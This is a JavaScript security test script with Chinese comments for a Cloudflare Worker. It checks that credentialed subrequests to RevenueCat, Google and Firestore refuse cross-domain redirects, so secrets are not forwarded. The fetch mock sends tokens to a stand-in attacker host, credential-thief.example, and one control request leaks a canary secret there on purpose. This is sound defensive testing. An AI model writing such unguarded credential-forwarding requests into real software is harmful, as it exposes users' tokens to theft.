// 驗「帶憑證的 subrequest 不會把憑證交給跨網域 redirect 目的地」（2026-08-04 敵意稽核 C-1）。
//
// 背景：Cloudflare Workers 的 Request 文件逐字寫著——
//   "If the response is a redirect and the redirect mode is set to `follow` (see below), then all
//    headers will be forwarded to the redirect destination, even if the destination is a different
//    hostname or domain. This includes sensitive headers like `Cookie`, `Authorization`, or any
//    application-specific headers."
//   "The default for a new `Request` object is `follow`."
//   —— https://developers.cloudflare.com/workers/runtime-apis/request/
// 也就是說：上游（RevenueCat／Google／TDX）只要回一個跨網域 30x，我們的 Authorization 就會原樣
// 送到那個網域。這件事發生在**單一次 fetch() 內部**，所以 resolveRcNextPage() 那種對 response
// body 做的 origin 白名單完全攔不到——判準盲點第 1 條指的就是這個：既有兩支腳本的 fetch 替身
// 只記「我方送出的第一個 URL」，替身不會回 30x、也不模擬自動跟隨，於是 C-1 在它們眼裡全綠。
//
// 這支腳本補的就是那個維度：替身**忠實模擬 Workers 的 redirect 語意**，
//   · init.redirect === 'error' ⇒ 遇到 30x 直接 reject（不會有第二發請求）
//   · 未設定或 'follow'         ⇒ 跟隨，並把**原樣的 headers／body** 帶到新目的地
// 然後用金絲雀字串（LEAK_CANARY_*）標記每一種憑證，斷言「非白名單 host 的請求裡永遠不含金絲雀」。
// 沉默不是證據，所以同一支收集器另外跑一發**故意不設 redirect** 的對照請求：它必須真的洩漏，
// 證明替身與偵測器都有牙。
//
// 用法：node scripts/verify_plus_redirect_policy.mjs
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

// ── G0 自檢：驗的是哪棵樹（心得 32）。ROOT 由本檔自身路徑推導，不吃任何參數。 ──────────────
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const WORKER_PATH = path.join(ROOT, 'worker.js');
const md5 = (p) => createHash('md5').update(readFileSync(p)).digest('hex');
console.log(`[G0] ROOT=${ROOT}`);
console.log(`[G0] worker.js md5=${md5(WORKER_PATH)}`);

const { _plus } = await import('../worker.js');
const { plusStatus, resetFirestoreAccessTokenCache } = _plus;

let fails = 0;
const SECTIONS = ['1 跨網域 30x 不得帶走憑證', '2 替身與偵測器的正向對照', '3 原始碼掃描：每個帶憑證的 fetch 都設了 redirect'];
const seen = new Map();
let SECTION = '(未分段)';
const section = (name) => { SECTION = name; console.log(`\n===== ${name} =====`); };
const check = (ok, msg, detail = '') => {
  if (!ok) fails += 1;
  seen.set(SECTION, (seen.get(SECTION) || 0) + 1);
  console.log(`  ${ok ? 'PASS' : '❌FAIL'}  ${msg}${detail ? ` — ${detail}` : ''}`);
};

// ── 金絲雀：每一種憑證都給一個獨一無二、不可能自然出現的字串 ────────────────────────────
// 偵測器不去猜「憑證會放在哪個 header」，而是把整發請求（URL＋headers＋body）序列化後找金絲雀，
// 這樣 header 名稱改了、憑證改放 body 或 query，偵測器都還是抓得到。
const CANARY = 'LEAK_CANARY';
const RC_SECRET = `sk_${CANARY}_revenuecat_v2`;
const FIREBASE_KEY = `${CANARY}_firebase_web_key`;
const ID_TOKEN = `${CANARY}_firebase_id_token_${'x'.repeat(64)}`;
const OAUTH_TOKEN = `${CANARY}_google_oauth_access_token`;
const UID = 'uid-redirect-fixture';
const THIEF_HOST = 'credential-thief.example';
const THIEF_URL = `https://${THIEF_HOST}/capture`;
const LEGIT_HOSTS = new Set([
  'identitytoolkit.googleapis.com', 'api.revenuecat.com',
  'oauth2.googleapis.com', 'firestore.googleapis.com',
]);

const subscription = () => ({
  id: 'sub_redirect_fixture', customer_id: UID, gives_access: true, status: 'active',
  environment: 'production', current_period_ends_at: 1_800_000_000_000, ends_at: 1_800_000_000_000,
  entitlements: { items: [{ lookup_key: 'plus' }] },
});

// ── 忠實模擬 Workers redirect 語意的 fetch 替身 ────────────────────────────────────────
let requests = [];            // 每一發（含 redirect 跟隨產生的那一發）
let redirectingHost = null;   // 這一輪由哪個上游回 302
const realFetch = globalThis.fetch;

const serialize = (req) => `${req.url} ${JSON.stringify([...req.headers.entries()])} ${req.body || ''}`;
// 「這發請求帶著憑證嗎」：金絲雀字串，或 OAuth 的 JWT assertion（那顆是動態產生的，沒有固定值，
// 用它在表單裡的欄位名認）。
const carriesSecret = (req) => serialize(req).includes(CANARY) || /(^|[&?])assertion=/.test(String(req.body || ''));

async function hop(url, init, depth) {
  const headers = new Headers(init.headers || {});
  const body = typeof init.body === 'string' ? init.body : (init.body ? String(init.body) : '');
  requests.push({ url, host: new URL(url).host, headers, body, redirect: init.redirect, depth });

  if (redirectingHost && url.includes(redirectingHost)) {
    // Workers 語意：'error' ⇒ fetch() reject；預設 'follow' ⇒ 跟隨且**原樣轉送所有 header**。
    if (init.redirect === 'error') throw new TypeError('fetch failed: unexpected redirect');
    if (init.redirect === 'manual') return new Response(null, { status: 302, headers: { location: THIEF_URL } });
    if (depth >= 3) throw new TypeError('too many redirects');
    return await hop(THIEF_URL, init, depth + 1);          // 同一個 init ⇒ headers/body 原樣帶過去
  }
  if (url.startsWith(`https://${THIEF_HOST}`)) return new Response('{}', { status: 200 });
  if (url.includes('identitytoolkit.googleapis.com')) {
    return new Response(JSON.stringify({ users: [{ localId: UID }] }), { status: 200 });
  }
  if (url.includes('api.revenuecat.com')) {
    return new Response(JSON.stringify({ object: 'list', items: [subscription()], next_page: null }), { status: 200 });
  }
  if (url === 'https://oauth2.googleapis.com/token') {
    return new Response(JSON.stringify({ access_token: OAUTH_TOKEN, expires_in: 3600 }), { status: 200 });
  }
  // 資格文件寫入是「GET 現存文件 → 帶 precondition PATCH」兩發（CAS）。GET 必須回一份帶
  // updateTime 的真文件，否則寫入路徑會在讀完就中止，那發 PATCH 的 redirect 政策就等於沒被驗到。
  if (url.includes('firestore.googleapis.com')) {
    return new Response(JSON.stringify({
      name: `projects/project-fixture/databases/(default)/documents/entitlements/${UID}`,
      fields: { active: { booleanValue: false }, activeUntilMs: { integerValue: '0' },
        updatedAtMs: { integerValue: '1' }, source: { stringValue: 'plus-status' } },
      createTime: '2026-08-04T00:00:00.000000Z', updateTime: '2026-08-04T00:00:00.000000Z',
    }), { status: 200 });
  }
  return new Response('{}', { status: 599 });
}

globalThis.fetch = async (input, init = {}) => hop(String(typeof input === 'string' ? input : input.url), init, 0);

// wrangler secret 可貼真換行；這裡動態產生一次性測試金鑰，repo 裡不放固定私鑰。
const keyPair = await crypto.subtle.generateKey({
  name: 'RSASSA-PKCS1-v1_5', modulusLength: 2048,
  publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256',
}, true, ['sign', 'verify']);
const privateDer = new Uint8Array(await crypto.subtle.exportKey('pkcs8', keyPair.privateKey));
const PRIVATE_PEM = `-----BEGIN PRIVATE KEY-----\n${Buffer.from(privateDer).toString('base64').match(/.{1,64}/g).join('\n')}\n-----END PRIVATE KEY-----`;

const ENV = () => ({
  FIREBASE_WEB_API_KEY: FIREBASE_KEY,
  REVENUECAT_PROJECT_ID: 'project-fixture',
  REVENUECAT_V2_SECRET_KEY: RC_SECRET,
  FIRESTORE_PROJECT_ID: 'project-fixture',
  FIRESTORE_SERVICE_ACCOUNT_EMAIL: 'writer@example.invalid',
  FIRESTORE_SERVICE_ACCOUNT_PRIVATE_KEY: PRIVATE_PEM,
});
const statusRequest = () => new Request('https://railisland.tw/api/plus-status', {
  headers: { Authorization: `Bearer ${ID_TOKEN}`, 'cf-connecting-ip': '203.0.113.11' },
});

// ── 1. 四種帶憑證的上游各自回一個跨網域 302，憑證都不准跟過去 ───────────────────────────
section(SECTIONS[0]);
{
  const realConsoleError = console.error;
  for (const upstream of [...LEGIT_HOSTS]) {
    requests = [];
    redirectingHost = upstream;
    resetFirestoreAccessTokenCache();
    const logs = [];
    console.error = (...args) => logs.push(args.map(String).join(' '));
    try { await plusStatus(statusRequest(), ENV()); }
    finally { console.error = realConsoleError; }

    const offHost = requests.filter(req => !LEGIT_HOSTS.has(req.host));
    const leaked = offHost.filter(carriesSecret);
    check(leaked.length === 0,
      `${upstream} 回 302 到別的網域 ⇒ 憑證沒有跟過去（非白名單 host 的請求 ${offHost.length} 發，其中帶憑證 ${leaked.length} 發）`,
      JSON.stringify({ 非白名單: offHost.map(r => r.host), 洩漏: leaked.map(r => serialize(r).slice(0, 120)) }));

    const sent = requests.find(req => req.url.includes(upstream));
    check(sent && sent.redirect === 'error',
      `${upstream} 這一發請求真的帶著 redirect:'error' 出門（不是靠替身沒回 30x 才沒事）`,
      JSON.stringify({ redirect: sent && sent.redirect }));
  }
}

// ── 2. 正向對照：替身與偵測器真的抓得到洩漏（沉默不是證據）─────────────────────────────
section(SECTIONS[1]);
{
  // 故意重演舊寫法：同一個替身、同一個偵測器，只差沒設 redirect。它必須真的洩漏。
  requests = [];
  redirectingHost = 'api.revenuecat.com';
  await globalThis.fetch(`https://api.revenuecat.com/v2/projects/p/customers/${UID}/subscriptions`, {
    headers: { Authorization: `Bearer ${RC_SECRET}`, Accept: 'application/json' },
  });
  const thiefHits = requests.filter(req => req.host === THIEF_HOST);
  check(thiefHits.length === 1 && thiefHits.every(carriesSecret),
    '對照組：同一發請求**不設 redirect** ⇒ 替身確實跟隨到 credential-thief.example，而且憑證原樣被帶過去（證明上一段的「零洩漏」是保護造成的，不是替身沒本事表達 30x）',
    JSON.stringify({ 到達竊取端: thiefHits.length, 內容: thiefHits.map(r => serialize(r).slice(0, 120)) }));

  // 對照組 2：偵測器不是「看到 credential-thief 就喊」——沒帶憑證的同一發跟隨不算洩漏。
  requests = [];
  await globalThis.fetch(`https://api.revenuecat.com/v2/projects/p/customers/${UID}/subscriptions`, {
    headers: { Accept: 'application/json' },
  });
  const cleanHits = requests.filter(req => req.host === THIEF_HOST);
  check(cleanHits.length === 1 && cleanHits.every(req => !carriesSecret(req)),
    '對照組：不帶憑證的請求跟隨到同一個目的地 ⇒ 偵測器不誤報（它認的是憑證，不是 host）',
    JSON.stringify({ 到達竊取端: cleanHits.length }));

  // 對照組 3：redirect:'error' 的請求在替身上真的會 reject（不是被靜默當成 200）。
  requests = [];
  let rejected = false;
  try {
    await globalThis.fetch(`https://api.revenuecat.com/v2/projects/p/customers/${UID}/subscriptions`, {
      headers: { Authorization: `Bearer ${RC_SECRET}` }, redirect: 'error',
    });
  } catch (e) { rejected = true; }
  check(rejected && requests.filter(req => req.host === THIEF_HOST).length === 0,
    "對照組：redirect:'error' 遇到 30x ⇒ 替身如 Workers 那樣 reject，且沒有第二發請求",
    JSON.stringify({ rejected, 到達竊取端: requests.filter(r => r.host === THIEF_HOST).length }));
  redirectingHost = null;
}

globalThis.fetch = realFetch;

// ── 3. 原始碼掃描：worker.js 裡每一個 fetch 呼叫點都設了 redirect（除了具名豁免）───────────
// 上面那段是行為證據，但只走得到 Plus 這條路徑；TDX、Esri、刪帳號那幾支同樣帶憑證的 subrequest
// 沒有離線可驅動的入口。這一段是結構性補網。
//
// 🔴 規則刻意寫成「**每一個** fetch 呼叫點都要設 redirect，除非它在具名豁免清單裡」，而不是
// 「凡是引數裡看得到憑證字樣的才要設」。第一版正是後者，結果自己就有盲點：fetchDelayDay() 把
// `authorization` 放在呼叫點外面的 const headers 裡，引數文字裡一個憑證字樣都沒有 ⇒ 它被歸成
// 「不帶憑證」，那兩發即使拔掉 redirect 也不會變紅。安全預設值必須是「要設」，豁免要具名、
// 要有理由，而且豁免清單本身要被驗（沒用到的條目＝清單過期）。
section(SECTIONS[2]);
{
  const raw = readFileSync(WORKER_PATH, 'utf8');
  const code = blankComments(raw);      // 註解裡的 `fetch()` 只是說明文字，不是呼叫點

  // 自檢 A：直接對 blankComments() 本身下一支單元測試，用一個**已知答案**的小樣本，而不是
  // 拿 worker.js 的統計數字互推（那種比法分不出「這處 guard 本來就寫在註解裡」與「清除吃掉了
  // 一行程式碼」——第一版就是這樣誤紅的）。樣本刻意涵蓋三個會咬人的形狀：URL 字串裡的 `//`、
  // 區塊註解裡假裝成程式碼的內容、樣板字串裡的 `//` 與 ${}。
  const LEXER_FIXTURE = [
    "const u = 'https://a.example//x';   // 註解裡假裝有 fetch( 與 redirect: 'error'",
    "fetch(u, { redirect: 'error' });",
    "/* 區塊註解 fetch(bad) redirect: 'error' */",
    'const t = `https://b.example//y?q=${1}`; fetch(t);',
  ].join('\n');
  const lexed = blankComments(LEXER_FIXTURE);
  const lexerProblems = [];
  if (lexed.length !== LEXER_FIXTURE.length) lexerProblems.push('長度被改變');
  if ((lexed.match(/fetch\s*\(/g) || []).length !== 2) lexerProblems.push(`fetch( 應剩 2 處，實得 ${(lexed.match(/fetch\s*\(/g) || []).length}`);
  if ((lexed.match(/redirect:\s*'error'/g) || []).length !== 1) lexerProblems.push('註解裡的 redirect 沒清乾淨或程式碼裡的被清掉');
  if (!lexed.includes("'https://a.example//x'")) lexerProblems.push('URL 字串裡的 // 被誤判成行註解');
  if (!lexed.includes('fetch(t);')) lexerProblems.push('樣板字串裡的 // 或 ${} 讓後面的程式碼被吃掉');
  check(lexerProblems.length === 0,
    '註解清除器單元測試：字串／樣板裡的 // 不被當成註解，行註解與區塊註解裡的假程式碼被清乾淨，長度不變',
    JSON.stringify(lexerProblems));

  // 自檢 B：套到 worker.js 上時，註解裡那些 `fetch(` 的說明文字確實被排除了（否則清除等於沒做）。
  const rawFetchWords = (raw.match(/fetch\s*\(/g) || []).length;
  const codeFetchWords = (code.match(/fetch\s*\(/g) || []).length;
  check(raw.length === code.length && codeFetchWords < rawFetchWords,
    '註解清除自檢：套到 worker.js 上長度不變，且註解裡提到的 fetch( 真的被排除（不是原封不動照掃）',
    `原始 ${rawFetchWords} 處 → 清除註解後 ${codeFetchWords} 處`);

  // 只取「裸 fetch(」：排除 env.ASSETS.fetch(...) 這類成員呼叫，以及 `async fetch(request…)`
  // 這個 Worker 進入點的方法定義。
  const callRe = /(?<![.\w$])fetch\s*\(/g;
  const sites = [];
  let attempted = 0;
  let m;
  while ((m = callRe.exec(code))) {
    const before = code.slice(0, m.index).trimEnd();
    if (/\b(async|function)$/.test(before)) continue;          // 方法／函式定義，不是呼叫
    attempted += 1;
    const open = code.indexOf('(', m.index);
    const close = matchParen(code, open);
    if (close < 0) continue;
    sites.push({ line: code.slice(0, m.index).split('\n').length, text: code.slice(open + 1, close) });
  }
  check(sites.length === attempted && sites.length > 0,
    '切割器自檢：每一個 fetch( 呼叫點都成功切出完整引數（切不出來＝那個呼叫點等於沒被掃到）',
    `找到 ${attempted} 個呼叫點，切出 ${sites.length} 個`);

  // 具名豁免：完全不帶任何憑證的公開端點。redirect 在這裡不會外洩任何東西，而對方是別人的
  // 網站、日後改成用 30x 導向新路徑是完全合理的事，設 'error' 反而會把一個可用的資料源弄壞。
  const EXEMPT = [
    { why: '新北捷官網列車動態：公開端點、零憑證（連 User-Agent 都是禮貌性標示）', match: (t) => t.includes('trainstatus.ntmetro.com.tw') },
  ];
  const unguarded = sites.filter(site => !/redirect:\s*'error'/.test(site.text));
  const violations = unguarded.filter(site => !EXEMPT.some(rule => rule.match(site.text)));
  check(violations.length === 0,
    "worker.js 裡每一個 fetch 呼叫點都明確設了 redirect: 'error'（具名豁免除外）",
    violations.length ? `未設防且未豁免的行號：${violations.map(s => s.line).join(', ')}`
      : `已檢查 ${sites.length} 個呼叫點，其中 ${unguarded.length} 個走具名豁免`);

  // 自檢 C：豁免清單不得過期，也不得被拿來當萬用擋箭牌——每一條都必須恰好對到現存的一個
  // 呼叫點，而且那個呼叫點的引數裡不能出現任何憑證字樣。
  const CREDENTIAL_MARKERS = ['Authorization', 'authorization', 'client_secret', 'assertion', 'idToken', 'TOKEN', 'SECRET', 'KEY'];
  const exemptProblems = EXEMPT.map(rule => {
    const hits = sites.filter(site => rule.match(site.text));
    if (hits.length !== 1) return `${rule.why} ⇒ 對到 ${hits.length} 個呼叫點（應為 1）`;
    const dirty = CREDENTIAL_MARKERS.filter(marker => hits[0].text.includes(marker));
    return dirty.length ? `${rule.why} ⇒ 引數裡出現憑證字樣 ${dirty.join('/')}` : null;
  }).filter(Boolean);
  check(exemptProblems.length === 0 && sites.some(s => /redirect:\s*'error'/.test(s.text)),
    '豁免清單自檢：每一條豁免都恰好對到一個現存呼叫點、而且那個呼叫點真的不帶憑證；同時確實存在有設防的呼叫點（不是整批走豁免）',
    JSON.stringify({ 豁免問題: exemptProblems }));

  // 自檢 D（識別導向，不寫死數量）：六種憑證放法都真的落在「有設防」那一側。
  // 特別涵蓋 fetchDelayDay 那種「憑證在呼叫點外面的變數裡」的形狀——第一版的規則就是被它騙過。
  const guarded = sites.filter(site => /redirect:\s*'error'/.test(site.text));
  const missingKinds = [
    ['header 放 RevenueCat secret', s => /Authorization: `Bearer \$\{env\.REVENUECAT_V2_SECRET_KEY\}`/.test(s.text)],
    ['body 放 OAuth JWT assertion', s => s.text.includes('assertion,')],
    ['body 放 Firebase ID token', s => s.text.includes('JSON.stringify({ idToken })')],
    ['header 放 OAuth access token', s => /Authorization: `Bearer \$\{token\}`/.test(s.text)],
    ['body 放 TDX client_secret', s => s.text.includes('client_secret')],
    ['query 放 Esri token', s => s.text.includes('ESRI_WEB_TOKEN')],
    ["header 放小寫 authorization（TDX 那批）", s => /authorization: 'Bearer '/.test(s.text)],
    ['憑證在呼叫點外面的變數裡（fetchDelayDay 的 const headers）', s => /^\s*url,\s*\{\s*headers,/.test(s.text)],
  ].filter(([, hit]) => !guarded.some(hit)).map(([kind]) => kind);
  check(missingKinds.length === 0,
    '覆蓋率自檢：八種憑證放法（header/body/query、大小寫、動態值、呼叫點外的變數）都落在有設防的那一側',
    JSON.stringify({ 沒掃到的憑證放法: missingKinds }));
}

// 把註解字元換成空白（保留長度與換行），字串／樣板字面量原樣保留——URL 裡的 `//` 不可以被
// 當成行註解。regex literal 不特別處理：worker.js 沒有含 `//` 或 `/*` 的 regex，而自檢 A 會抓到
// 「清除吃到程式碼」這件事。
function blankComments(src) {
  const out = src.split('');
  const n = src.length;
  let i = 0;
  while (i < n) {
    const c = src[i];
    if (c === '/' && src[i + 1] === '/') {
      while (i < n && src[i] !== '\n') { out[i] = ' '; i += 1; }
      continue;
    }
    if (c === '/' && src[i + 1] === '*') {
      while (i < n && !(src[i] === '*' && src[i + 1] === '/')) { if (src[i] !== '\n') out[i] = ' '; i += 1; }
      if (i < n) { out[i] = ' '; out[i + 1] = ' '; i += 2; }
      continue;
    }
    if (c === "'" || c === '"' || c === '`') {
      const quote = c;
      i += 1;
      while (i < n && src[i] !== quote) i += src[i] === '\\' ? 2 : 1;
      i += 1;
      continue;
    }
    i += 1;
  }
  return out.join('');
}

// 照括號深度配對；字串／樣板字面量整段跳過。註解已經先被 blankComments() 清乾淨。
function matchParen(src, open) {
  let depth = 0;
  for (let i = open; i < src.length; i += 1) {
    const c = src[i];
    if (c === "'" || c === '"' || c === '`') {
      const quote = c;
      i += 1;
      while (i < src.length && src[i] !== quote) i += src[i] === '\\' ? 2 : 1;
      continue;
    }
    if (c === '(') depth += 1;
    else if (c === ')') { depth -= 1; if (depth === 0) return i; }
  }
  return -1;
}

SECTION = '(收尾)';
const missing = SECTIONS.filter(name => !seen.get(name));
check(missing.length === 0, '每個宣告過的段落都真的跑過至少一條判準',
  missing.length ? `沒跑到：${missing.join('、')}` : SECTIONS.map(s => `${s}=${seen.get(s)}`).join(' '));
console.log(`\n──────── ${fails ? `${fails} 條 FAIL` : '全部 PASS'} ────────`);
process.exit(fails ? 1 : 0);
